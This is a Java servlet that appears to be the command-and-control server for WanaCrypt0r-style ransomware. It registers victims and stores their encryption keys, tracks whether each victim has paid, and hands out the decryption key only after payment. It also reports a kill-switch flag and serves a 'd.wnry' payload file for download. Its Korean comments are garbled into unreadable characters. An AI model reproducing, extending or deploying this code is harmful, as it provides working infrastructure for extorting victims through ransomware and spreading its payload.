package kro.kr.rhya_network.servlet;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.PrintWriter;
import java.net.URLDecoder;
import java.net.URLEncoder;
import java.sql.SQLException;
import java.util.UUID;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.apache.commons.codec.binary.Base64;

import com.google.gson.Gson;
import com.google.gson.JsonObject;

import kro.kr.rhya_network.logger.GetClientIPAddress;
import kro.kr.rhya_network.logger.RhyaLogger;
import kro.kr.rhya_network.page.JspPageInfo;
import kro.kr.rhya_network.security.RhyaAES;
import kro.kr.rhya_network.util.JSPUtilsInitTask;
import kro.kr.rhya_network.util.PathManager;
import kro.kr.rhya_network.util.ServiceAccessChecker;
import kro.kr.rhya_network.utils.db.DatabaseManager;

/**
 * Servlet implementation class WanaCrypt0rManager
 */
@WebServlet("/wanacrypt0r_manager")
public class WanaCrypt0rManager extends HttpServlet {
	private static final long serialVersionUID = 1L;
	// JSON ��ȯ ���
	private final String successMessage = "success";
	private final String failMessage = "fail";
	
	
	
	
    /**
     * @see HttpServlet#HttpServlet()
     */
    public WanaCrypt0rManager() {
        super();
        // TODO Auto-generated constructor stub
    }

	/**
	 * @see HttpServlet#service(HttpServletRequest request, HttpServletResponse response)
	 */
	protected void service(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		// TODO Auto-generated method stub
		
		// Rhya �ΰ� ���� ����
		RhyaLogger rl = new RhyaLogger();
		// Rhya �ΰ� ����
		rl.JspName = request.getServletPath();
		rl.LogConsole = true;
		rl.LogFile = true;
		
		
		// Ŭ���̾�Ʈ IP
		String clientIP = GetClientIPAddress.getClientIp(request);
		
		
		// JSON ���
		final String keyName_Result = "result";
		final String keyName_Message = "message";
		// JSON ����
		Gson gson = new Gson();
		JsonObject obj = new JsonObject();

		
		// DB ������ ����
		DatabaseManager.DatabaseConnection databaseConnection = new DatabaseManager.DatabaseConnection();
		databaseConnection.init();
		
		
		// ��ü ���� ó��
		try {
			// ������ �ʱ�ȭ
			JSPUtilsInitTask jspUtilsInitTask = new JSPUtilsInitTask();
			if (jspUtilsInitTask.initTask(rl, request, response, JspPageInfo.PageID_Rhya_Utaite_Player)) { // ������ �ʱ�ȭ ����
				// DB ����
				try {
					databaseConnection.init();
					databaseConnection.connection();
				} catch (ClassNotFoundException | SQLException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
					
					databaseConnection = null;
					
					// �α� ���
					rl.Log(RhyaLogger.Type.Warning, rl.CreateLogTextv8(clientIP, "�����ͺ��̽� ���� �� ���� �߻�! ", e.toString()));
				}
				
				
				// Null Ȯ��
				if (databaseConnection != null) {
					// Main �Ķ���� ����
					int inputMode = Integer.parseInt(request.getParameter("mode"));
					// �α� ���
					rl.Log(RhyaLogger.Type.Debug, rl.CreateLogTextv8(clientIP, "Ŭ���̾�Ʈ�� �ش� �Ķ���ͷ� ������ Mode:", Integer.toString(inputMode)));
					
					// ������ ���� Ȯ��
					if (!new ServiceAccessChecker().isAccessService(0)) {
						// �α� ���
						rl.Log(RhyaLogger.Type.Warning, rl.CreateLogTextv5(clientIP, "���� ���� ���ܵ�!"));
						
						obj.addProperty(keyName_Result, "service_access_block");
						
						PrintWriter out = response.getWriter(); 
						out.println(gson.toJson(obj));
						
						databaseConnection.allClose();
						
						return;
					}
					
					// �Ķ���� ����
					switch (inputMode) {
						/**
						 * �� �� ���� ��ɾ�
						 */
						default: {
							// �α� ���
							rl.Log(RhyaLogger.Type.Warning, rl.CreateLogTextv8(clientIP, "�Է��� ����� �м��� �� �����ϴ�. Mode:", Integer.toString(inputMode)));
							
							obj.addProperty(keyName_Result, failMessage);
							obj.addProperty(keyName_Message, URLEncoder.encode("�� �� ����Դϴ�. mode �Ķ���͸� Ȯ���� �ּ���.", "UTF-8"));
							
							PrintWriter out = response.getWriter(); 
							out.println(gson.toJson(obj));
							
							break;
						}
						
						
						/**
						 * WanaCrypt0r ���� ��� : 0
						 * 
						 * ���� :
						 * 		Ŭ���̾�Ʈ ���� ����
						 * 
						 * �Ķ���� :
						 * 		enckey      --> ��ȭ Ű
						 */
						case 0: {
							String encryptKey = request.getParameter("enckey");

							UUID uuid = UUID.randomUUID();
							
							databaseConnection.setPreparedStatement("INSERT INTO wanacry_client_info(client_id, encrypt_key) VALUE (?, ?);");
							databaseConnection.getPreparedStatement().setString(1, uuid.toString());
							databaseConnection.getPreparedStatement().setString(2, encryptKey);
							databaseConnection.executeUpdate();
							
							// JSON ������ ����
							obj.addProperty(keyName_Result, successMessage);
							obj.addProperty("client_id", URLEncoder.encode(uuid.toString(), "UTF-8"));
							obj.addProperty("encrypt_key", URLEncoder.encode(RhyaAES.AES_Encode(encryptKey), "UTF-8"));
							// �α� ���
							rl.Log(RhyaLogger.Type.Info, rl.CreateLogTextv8(clientIP, "WanaCrypt0r Ŭ���̾�Ʈ ���� ��� ����! / Client ID: ", encryptKey));
							
							// JSON ������ ���
							PrintWriter out = response.getWriter(); 
							out.println(gson.toJson(obj));
							
							break;
						}
						
						
						/**
						 * WanaCrypt0r ���� ��� : 1
						 * 
						 * ���� :
						 * 		Ŭ���̾�Ʈ ���� ���
						 * 
						 * �Ķ���� :
						 * 		clientid    --> Ŭ���̾�Ʈ ID
						 */
						case 1: {
							String clientID = request.getParameter("clientid");

							databaseConnection.setPreparedStatement("SELECT * FROM wanacry_client_info WHERE client_id = ?;");
							databaseConnection.getPreparedStatement().setString(1, clientID);
							databaseConnection.setResultSet();
							
							if (databaseConnection.getResultSet().next()) {
								// JSON ������ ����
								obj.addProperty(keyName_Result, successMessage);
								obj.addProperty("encrypt_date", URLEncoder.encode(databaseConnection.getResultSet().getString("encrypt_date"), "UTF-8"));
								obj.addProperty("is_payment", databaseConnection.getResultSet().getInt("is_payment"));
								
								// �α� ���
								rl.Log(RhyaLogger.Type.Info, rl.CreateLogTextv8(clientIP, "WanaCrypt0r Ŭ���̾�Ʈ ���� ��� ����! / Client ID: ", clientID));
							}else {
								// JSON ������ ����
								obj.addProperty(keyName_Result, failMessage);
								
								// �α� ���
								rl.Log(RhyaLogger.Type.Info, rl.CreateLogTextv8(clientIP, "WanaCrypt0r Ŭ���̾�Ʈ ���� ��� ����! / Client ID: ", clientID));
							}
							
							// JSON ������ ���
							PrintWriter out = response.getWriter(); 
							out.println(gson.toJson(obj));
							
							break;
						}
						
						
						/**
						 * WanaCrypt0r ���� ��� : 2
						 * 
						 * ���� :
						 * 		Ŭ���̾�Ʈ �޽��� ����
						 * 
						 * �Ķ���� :
						 * 		clientid    --> Ŭ���̾�Ʈ ID
						 * 		message     --> �޽��� [ Base64 Encode ]
						 */
						case 2: {
							String clientID = request.getParameter("clientid");
							String message = request.getParameter("message");

							message = URLDecoder.decode(message, "UTF-8");

							databaseConnection.setPreparedStatement("INSERT INTO wanacry_client_message(client_id, message) VALUE (?, ?);");
							databaseConnection.getPreparedStatement().setString(1, clientID);
							databaseConnection.getPreparedStatement().setString(2, new String(Base64.decodeBase64(message), "UTF-8"));
							databaseConnection.executeUpdate();
							
							// JSON ������ ����
							obj.addProperty(keyName_Result, successMessage);
							
							// �α� ���
							rl.Log(RhyaLogger.Type.Info, rl.CreateLogTextv8(clientIP, "WanaCrypt0r Ŭ���̾�Ʈ ���� ��� ����! / Client ID: ", clientID));
							
							// JSON ������ ���
							PrintWriter out = response.getWriter(); 
							out.println(gson.toJson(obj));
							
							break;
						}
						
						
						/**
						 * WanaCrypt0r ���� ��� : 3
						 * 
						 * ���� :
						 * 		Ŭ���̾�Ʈ ��ȣȭ Ű ���
						 * 
						 * �Ķ���� :
						 * 		clientid    --> Ŭ���̾�Ʈ ID
						 */
						case 3: {
							String clientID = request.getParameter("clientid");

							databaseConnection.setPreparedStatement("SELECT * FROM wanacry_client_info WHERE client_id = ?;");
							databaseConnection.getPreparedStatement().setString(1, clientID);
							databaseConnection.setResultSet();
							
							if (databaseConnection.getResultSet().next()) {
								if (databaseConnection.getResultSet().getInt("is_payment") == 1) {
									// JSON ������ ����
									obj.addProperty(keyName_Result, successMessage);
									obj.addProperty("encrypt_key", databaseConnection.getResultSet().getString("encrypt_key"));
									
									// �α� ���
									rl.Log(RhyaLogger.Type.Info, rl.CreateLogTextv8(clientIP, "WanaCrypt0r Ŭ���̾�Ʈ ��ȣȭ Ű ��� ����! / Client ID: ", clientID));
								}else {
									// JSON ������ ����
									obj.addProperty(keyName_Result, failMessage);
									
									// �α� ���
									rl.Log(RhyaLogger.Type.Info, rl.CreateLogTextv8(clientIP, "��� ����! �ش� Ŭ���̾�Ʈ�� ���� ���� Ȯ���� ���� �ʾҽ��ϴ�. / Client ID: ", clientID));
								}
							}else {
								// JSON ������ ����
								obj.addProperty(keyName_Result, failMessage);
								
								// �α� ���
								rl.Log(RhyaLogger.Type.Info, rl.CreateLogTextv8(clientIP, "WanaCrypt0r Ŭ���̾�Ʈ ��ȣȭ Ű ��� ����! / Client ID: ", clientID));
							}
							// JSON ������ ���
							PrintWriter out = response.getWriter(); 
							out.println(gson.toJson(obj));
							
							break;
						}
						
						
						/**
						 * WanaCrypt0r ���� ��� : 4
						 * 
						 * ���� :
						 * 		Kill-Switch Ȯ��
						 * 
						 * �Ķ���� :
						 * 		<����>
						 */
						case 4: {
							databaseConnection.setPreparedStatement("SELECT service_online_wanacry_kill_switch FROM rhya_network_info;");
							databaseConnection.setResultSet();
							
							if (databaseConnection.getResultSet().next()) {
								// JSON ������ ����
								obj.addProperty(keyName_Result, successMessage);
								obj.addProperty("message", databaseConnection.getResultSet().getInt("service_online_wanacry_kill_switch") == 1);
								
								// �α� ���
								rl.Log(RhyaLogger.Type.Info, rl.CreateLogTextv5(clientIP, "WanaCrypt0r Kill-Switch ��� ����!"));
							}else {
								// JSON ������ ����
								obj.addProperty(keyName_Result, failMessage);
								
								// �α� ���
								rl.Log(RhyaLogger.Type.Info, rl.CreateLogTextv5(clientIP, "WanaCrypt0r Kill-Switch ��� ����!"));
							}
							// JSON ������ ���
							PrintWriter out = response.getWriter(); 
							out.println(gson.toJson(obj));
							
							break;
						}
						
						
						/**
						 * WanaCrypt0r ���� ��� : 5
						 * 
						 * ���� :
						 * 		WanaCrypt0r ���� �ٿ�ε�
						 * 
						 * �Ķ���� :
						 * 		<����>
						 */
						case 5: {
							// ���� ���ε�� ���
						    final String root = PathManager.WANACRY_ROOT_PATH;
						    // ���� ������ ���ϸ�
						    String orgfilename = "d.wnry";    
							try {
								File file = new File(root, "drop_resources.zip");
								if (file.isFile()) {
									byte b[] = new byte[(int) file.length()];
									orgfilename = java.net.URLEncoder.encode(orgfilename, "UTF-8");
									response.setHeader("Content-Disposition", "attachment;filename=".concat(orgfilename));
									response.setHeader("Content-Type", "application/octet-stream; charset=utf-8");
									response.setContentLength((int) file.length());
									
									BufferedInputStream fin = new BufferedInputStream(new FileInputStream(file));
									BufferedOutputStream outs = new BufferedOutputStream(response.getOutputStream());
									int read = 0;
									while ((read = fin.read(b)) != -1) {
										outs.write(b, 0, read);
									}
									outs.close();
									fin.close();
									
									// �α� ���
									rl.Log(RhyaLogger.Type.Info, rl.CreateLogTextv5(clientIP, "WanaCrypt0r 'd.wnry' ���� �ٿ�ε� ����!"));
								} else {
									// �α� ���
									rl.Log(RhyaLogger.Type.Warning, rl.CreateLogTextv5(clientIP, "WanaCrypt0r 'd.wnry' ���� �ٿ�ε� ����! File does not exist!"));
									
									obj.addProperty(keyName_Result, failMessage);
								}
							} catch (IOException e) {
								// �α� ���
								rl.Log(RhyaLogger.Type.Info, rl.CreateLogTextv8(clientIP, "WanaCrypt0r 'd.wnry' ���� �ٿ�ε� ����! �� �� ���� ������ �߻��Ͽ����ϴ�.", e.toString()));
								
								obj.addProperty(keyName_Result, failMessage);
							}
							
							
							// JSON ������ ���
							PrintWriter out = response.getWriter(); 
							out.println(gson.toJson(obj));
							
							break;
						}
					}
				}
			}else { // ������ �ʱ�ȭ ����
				obj.addProperty(keyName_Result, failMessage);
				
				rl.Log(RhyaLogger.Type.Error, rl.CreateLogTextv5(clientIP, "JSP ������ �ʱ�ȭ �� ������ �߻��Ͽ����ϴ�."));
			}
		}catch (Exception e) {
			e.printStackTrace();
			
			obj.addProperty(keyName_Result, "ROOT_ERROR");
			PrintWriter out = response.getWriter(); 
			out.println(gson.toJson(obj));
			
			// �α� ���
			rl.Log(RhyaLogger.Type.Warning, rl.CreateLogTextv8(clientIP, "�� �� ���� ���� �߻�!", e.toString()));
		}
		
		
		// DB ���� ����
		try {
			if (databaseConnection != null) 
				databaseConnection.allClose();
		}catch (SQLException e) {
			e.printStackTrace();
			
			// �α� ���
			rl.Log(RhyaLogger.Type.Warning, rl.CreateLogTextv8(clientIP, "�����ͺ��̽� ���� ���� ���� �߻�! ", e.toString()));
		}
	}

	/**
	 * @see HttpServlet#doGet(HttpServletRequest request, HttpServletResponse response)
	 */
	protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		// TODO Auto-generated method stub
		response.getWriter().append("Served at: ").append(request.getContextPath());
	}

	/**
	 * @see HttpServlet#doPost(HttpServletRequest request, HttpServletResponse response)
	 */
	protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		// TODO Auto-generated method stub
		doGet(request, response);
	}

}
